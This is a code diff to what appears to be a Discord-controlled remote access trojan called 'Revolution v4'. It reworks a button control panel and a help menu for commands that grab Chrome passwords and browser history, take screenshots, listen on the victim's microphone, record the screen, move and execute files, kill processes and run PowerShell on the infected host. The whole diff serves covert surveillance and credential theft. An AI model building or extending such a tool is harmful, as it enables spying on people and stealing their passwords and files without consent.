@@ -970,69 +970,94 @@ class ControlPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    # --- ROW 1: DATA & SYSTEM ---
+    # --- ROW 1: SPYING & DATA ---
     @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.green, row=0)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         ctx = await rev_bot.get_context(interaction.message)
         await interaction.response.defer()
         await ctx.invoke(rev_bot.get_command('ss'))
 
-    @discord.ui.button(label="🕵️ Grab Chrome", style=discord.ButtonStyle.danger, row=0)
+    @discord.ui.button(label="🕵️ Chrome Logs", style=discord.ButtonStyle.danger, row=0)
     async def grab_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         ctx = await rev_bot.get_context(interaction.message)
         await interaction.response.defer()
         await ctx.invoke(rev_bot.get_command('grab'))
 
-    @discord.ui.button(label="📋 Task List", style=discord.ButtonStyle.blurple, row=0)
-    async def task_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="📜 History", style=discord.ButtonStyle.secondary, row=0)
+    async def hist_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         ctx = await rev_bot.get_context(interaction.message)
         await interaction.response.defer()
-        await ctx.invoke(rev_bot.get_command('task'))
+        await ctx.invoke(rev_bot.get_command('history'))
 
-    @discord.ui.button(label="🛑 End Task", style=discord.ButtonStyle.secondary, row=0)
-    async def end_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("To end a task, type: `!end <number>`", ephemeral=True)
-
-    # --- ROW 2: FILE MANAGEMENT ---
-    @discord.ui.button(label="📂 List (ls)", style=discord.ButtonStyle.gray, row=1)
-    async def ls_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        ctx = await rev_bot.get_context(interaction.message)
-        await interaction.response.defer()
-        await ctx.invoke(rev_bot.get_command('ls'))
-
-    @discord.ui.button(label="📍 PWD", style=discord.ButtonStyle.gray, row=1)
-    async def pwd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        ctx = await rev_bot.get_context(interaction.message)
-        await ctx.invoke(rev_bot.get_command('pwd'))
-
-    @discord.ui.button(label="📁 Change Dir", style=discord.ButtonStyle.gray, row=1)
-    async def cd_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("To move, type: `!cd <folder>` or `!cd ..`", ephemeral=True)
-
-    @discord.ui.button(label="🚀 Execute", style=discord.ButtonStyle.primary, row=1)
-    async def exec_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("To run a file, type: `!execute <filename>`", ephemeral=True)
-
-    # --- ROW 3: TRANSFER & MEDIA ---
-    @discord.ui.button(label="📤 Upload", style=discord.ButtonStyle.success, row=2)
-    async def upload_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("Type `!upload single` or `!upload multiple` then drop files.",
-                                                ephemeral=True)
-
-    @discord.ui.button(label="📥 Download", style=discord.ButtonStyle.success, row=2)
-    async def dl_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("To download, type: `!download <filename>`", ephemeral=True)
-
-    @discord.ui.button(label="🎙️ Join Mic", style=discord.ButtonStyle.primary, row=2)
+    # --- ROW 2: LIVE MONITORING ---
+    @discord.ui.button(label="🎙️ Join Mic", style=discord.ButtonStyle.primary, row=1)
     async def join_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         ctx = await rev_bot.get_context(interaction.message)
         await interaction.response.defer()
         await ctx.invoke(rev_bot.get_command('join'))
 
-    @discord.ui.button(label="🔇 Leave Mic", style=discord.ButtonStyle.danger, row=2)
+    @discord.ui.button(label="⏺️ Start Rec", style=discord.ButtonStyle.success, row=1)
+    async def rec_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await rev_bot.get_context(interaction.message)
+        await interaction.response.defer()
+        await ctx.invoke(rev_bot.get_command('start_rec'))
+
+    @discord.ui.button(label="🛑 Stop Rec", style=discord.ButtonStyle.danger, row=1)
+    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await rev_bot.get_context(interaction.message)
+        await interaction.response.defer()
+        await ctx.invoke(rev_bot.get_command('stop_rec'))
+
+    # --- ROW 3: SYSTEM & FILES ---
+    @discord.ui.button(label="📋 Tasks", style=discord.ButtonStyle.blurple, row=2)
+    async def task_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await rev_bot.get_context(interaction.message)
+        await interaction.response.defer()
+        await ctx.invoke(rev_bot.get_command('task'))
+
+    @discord.ui.button(label="📂 List Files", style=discord.ButtonStyle.gray, row=2)
+    async def ls_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        ctx = await rev_bot.get_context(interaction.message)
+        await interaction.response.defer()
+        await ctx.invoke(rev_bot.get_command('ls'))
+
+    @discord.ui.button(label="🔌 Leave VC", style=discord.ButtonStyle.secondary, row=2)
     async def leave_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         ctx = await rev_bot.get_context(interaction.message)
         await ctx.invoke(rev_bot.get_command('leave'))
+
+# --- Updated Help Command ---
+@rev_bot.command()
+async def help(ctx):
+    embed = discord.Embed(
+        title="🕹️ Revolution v4 | System Control",
+        description=f"Managing Host: **{PC_NAME}**\nUse the buttons below for one-click actions.",
+        color=0x2b2d31
+    )
+    
+    embed.add_field(
+        name="🕵️ Data Extraction", 
+        value="`!grab` - Chrome Passwords\n`!history` - Browser History\n`!ss` - Screenshot", 
+        inline=False
+    )
+    embed.add_field(
+        name="🎙️ Audio & Video", 
+        value="`!join` / `!leave` - Live Mic\n`!start_rec` / `!stop_rec` - Screen Clips\n`!list_mics` - View HW", 
+        inline=False
+    )
+    embed.add_field(
+        name="📂 File System", 
+        value="`!ls` / `!cd` / `!pwd` - Navigate\n`!upload` / `!download` - Transfer\n`!execute` - Run file", 
+        inline=False
+    )
+    embed.add_field(
+        name="⚙️ OS Management", 
+        value="`!task` - Process List\n`!end <ID>` - Kill Process\n`!shell <cmd>` - PowerShell", 
+        inline=False
+    )
+
+    embed.set_footer(text="Revolution v4 | Authorized Access Only")
+    await ctx.send(embed=embed, view=ControlPanel())
 
 
 # --- Help Command Update ---
